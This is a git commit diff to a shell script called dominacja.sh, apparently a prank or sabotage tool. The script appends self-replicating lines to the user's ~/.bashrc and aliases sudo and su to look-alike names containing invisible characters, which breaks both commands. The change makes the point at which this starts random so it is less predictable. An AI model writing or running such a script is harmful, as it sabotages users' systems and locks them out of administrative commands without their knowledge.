0789764bbcfecd2266015baf23615b1e6eb09a5f
XXXDominatorXXX <101982442+XXXDominatorXXX@users.noreply.github.com>
2022-03-20 17:02:34 +0100

    Mniejsza przewidywalność

--- dominacja.sh
+++ dominacja.sh
@@ -11,8 +11,8 @@ echo 'fi' >> ~/.bashrc
 echo 'LOL=$(($LOL+1))' >> ~/.bashrc
 
 # Clone script on every console execution
-# For Fourth User sudo and su will stop working
-echo "echo 'if [ \$LOL -gt 3 ]' >> ~/.bashrc" >> ~/.bashrc
+# For Fourth (Or Later) User sudo and su will stop working
+echo "echo 'if [ \$LOL -gt \$((2+\$RANDOM%10)) ]' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'then' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'alias sudo=sud‎o' >> ~/.bashrc" >> ~/.bashrc
 echo "echo 'alias su=s‎u' >> ~/.bashrc" >> ~/.bashrc
